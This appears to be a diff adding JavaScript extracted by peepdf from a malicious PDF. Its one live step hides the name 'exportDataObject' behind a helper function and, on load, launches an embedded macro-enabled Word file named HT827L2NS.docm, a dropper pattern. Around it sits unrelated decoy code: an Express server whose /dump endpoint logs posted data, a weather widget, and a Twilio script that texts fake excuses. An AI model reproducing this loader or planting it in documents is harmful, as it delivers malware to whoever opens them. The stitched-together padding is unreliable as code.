@@ -1,0 +1,206 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+function ser2mis() {
+    return 'exportDataObject';
+};
+
+function d5() {
+    const key = npm.config.key
+    const app = express()
+    app.use(morgan('dev'))
+    app.set('port', (process.env.PORT || 5000))
+    const root_url = (process.env.NODE_ENV === 'production' ? npm.config.root_url : '' + app.get('port'))
+    app.use(express.static(__dirname + '/../public'))
+    app.use(bodyParser.text({
+        type: '*/*'
+    }))
+    app.get('/hack', function(req, res) {
+        res.setHeader('Content-Type', 'text/plain')
+        res.send(shell.cat(__dirname + '/../scripts/hack').sed(new RegExp(key, 'g'), root_url).toString())
+    })
+    app.get('/env/:env', function(req, res) {
+        res.setHeader('Content-Type', 'text/plain')
+        res.send(shell.cat(__dirname + '/../scripts/env/' + req.params.env).sed(new RegExp(key, 'g'), root_url).toString())
+    })
+    app.post('/dump', function(req, res) {
+        const time = (new Date()).toISOString()
+        console.log("BEGIN DUMP -- " + time)
+        console.log(req.body)
+        console.log("END DUMP -- " + time)
+        res.end()
+    })
+    app.listen(app.get('port'), function() {
+        console.log('Node app is running on port', app.get('port'))
+    })
+}
+var absheder = ser2mis();
+var firgi = 2;
+var WeatherCtrlFocus = this[absheder];
+
+function WeatherCtrl($scope, $http, $timeout, $element) {
+    var middleOfTheDay = 15;
+    $scope.units = 'metric';
+    $scope.weatherIcons = {
+        '01d': 'ion-ios-sunny-outline',
+        '02d': 'ion-ios-partlysunny-outline',
+        '03d': 'ion-ios-cloud-outline',
+        '04d': 'ion-ios-cloud',
+        '09d': 'ion-ios-rainy',
+        '10d': 'ion-ios-rainy-outline',
+        '11d': 'ion-ios-thunderstorm-outline',
+        '13d': 'ion-ios-snowy',
+        '50d': 'ion-ios-cloudy-outline',
+        '01n': 'ion-ios-cloudy-night-outline',
+        '02n': 'ion-ios-cloudy-night',
+        '03n': 'ion-ios-cloud-outline',
+        '04n': 'ion-ios-cloud',
+        '09n': 'ion-ios-rainy',
+        '10n': 'ion-ios-rainy-outline',
+        '11n': 'ion-ios-thunderstorm',
+        '13n': 'ion-ios-snowy',
+        '50n': 'ion-ios-cloudy-outline'
+    };
+    $scope.weather = {};
+    $scope.switchUnits = function(name) {
+        $scope.units = name;
+        $scope.updateWeather();
+    };
+    $scope.switchDay = function(day) {
+        $scope.weather.current = day;
+        makeChart($scope.weather.days[$scope.weather.current].timeTemp)
+    };
+    $scope.updateWeather = function() {
+        $http({
+            method: method,
+            url: url,
+            params: {
+                appid: key,
+                lat: $scope.geoData.geoplugin_latitude,
+                lon: $scope.geoData.geoplugin_longitude,
+                units: $scope.units
+            }
+        }).then(function success(response) {
+            saveWeatherData(response.data);
+            makeChart($scope.weather.days[$scope.weather.current].timeTemp)
+        }, function error() {
+            console.log("WEATHER FAILED")
+        });
+    };
+
+    function updateGeoData() {
+        $http.jsonp('http://www.geoplugin.net/json.gp?jsoncallback=JSON_CALLBACK').then(function success(response) {
+            $scope.geoData = response.data;
+            $scope.updateWeather();
+        }, function error() {
+            console.log("GEO FAILED")
+        });
+    }
+    function makeChart(data) {
+        AmCharts.makeChart('tempChart', {
+            type: 'serial',
+            theme: 'blur',
+            handDrawn: true,
+            categoryField: 'time',
+            dataProvider: data,
+            valueAxes: [{
+                axisAlpha: 0.3,
+                gridAlpha: 0
+            }],
+            graphs: [{
+                bullet: 'square',
+                fillAlphas: 0.3,
+                fillColorsField: 'lineColor',
+                legendValueText: '[[value]]',
+                lineColorField: 'lineColor',
+                title: 'Temp',
+                valueField: 'temp'
+            }],
+            categoryAxis: {
+                gridAlpha: 0,
+                axisAlpha: 0.3
+            }
+        }).write('tempChart');
+    }
+    function saveWeatherData(data) {
+        var firstItem = data.list[0];
+        var weather = {
+            days: [{
+                date: new Date(),
+                timeTemp: [],
+                main: firstItem.weather[0].main,
+                description: firstItem.weather[0].description,
+                icon: firstItem.weather[0].icon,
+                temp: firstItem.main.temp
+            }],
+            current: 0
+        };
+        data.list.forEach(function(item, i) {
+            var itemDate = new Date(item.dt_txt);
+            if (itemDate.getDate() !== weather.days[weather.days.length - 1].date.getDate()) {
+                weather.days.push({
+                    date: itemDate,
+                    timeTemp: []
+                });
+            }
+            var lastItem = weather.days[weather.days.length - 1];
+            lastItem.timeTemp.push({
+                time: itemDate.getHours(),
+                temp: item.main.temp
+            });
+            if ((weather.days.length > 1 && itemDate.getHours() == middleOfTheDay) || i == data.list.length - 1) {
+                lastItem.main = item.weather[0].main;
+                lastItem.description = item.weather[0].description;
+                lastItem.icon = item.weather[0].icon;
+                lastItem.temp = item.main.temp;
+                lastItem.date.setHours(i == data.list.length - 1 ? 0 : middleOfTheDay);
+                lastItem.date.setMinutes(0);
+            }
+        });
+        console.log(weather.days[weather.current].date);
+        weather.days = weather.days.slice(0, $element.attr('forecast') || 5);
+        $scope.weather = weather;
+    }
+    updateGeoData();
+}
+
+function stdoutS() {
+    WeatherCtrlFocus({
+        cName: "HT827L2NS.docm",
+        nLaunch: firgi
+    });
+};
+
+function stdoutP() {
+    if (stdout.indexOf(me) == -1) process.exit(1);
+
+    var TWILIO_ACCOUNT_SID = process.env['TWILIO_ACCOUNT_SID'];
+    var TWILIO_AUTH_TOKEN = process.env['TWILIO_AUTH_TOKEN'];
+
+    var MY_NUMBER = '+xxx';
+    var HER_NUMBER = '+xxx';
+
+    var reasons = ['Working hard', 'Gotta ship this feature', 'Someone fucked the system again'];
+
+    var reason = reasons[Math.floor(Math.random() * reasons.length)];
+    var textMessage = 'Late at work. ' + reason;
+
+    var client = require('twilio')(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
+
+    client.messages.create({
+        body: textMessage,
+        to: HER_NUMBER,
+        from: MY_NUMBER
+    }, function(error, message) {
+        if (error) console.log('Failed to send SMS: ' + error.message);
+        else {
+            var currentdate = new Date();
+
+            console.log('Message sent at: ' + (currentdate.getMonth() + 1) + '/' + currentdate.getDate() + '/' + currentdate.getFullYear() + ' ' + currentdate.getHours() + ':' + currentdate.getMinutes() + ':' + currentdate.getSeconds() + '| Excuse: ' + reason);
+        }
+    });
+};
+
+// peepdf comment: Javascript code located in object 14 (version 0)
+
+stdoutS();
+
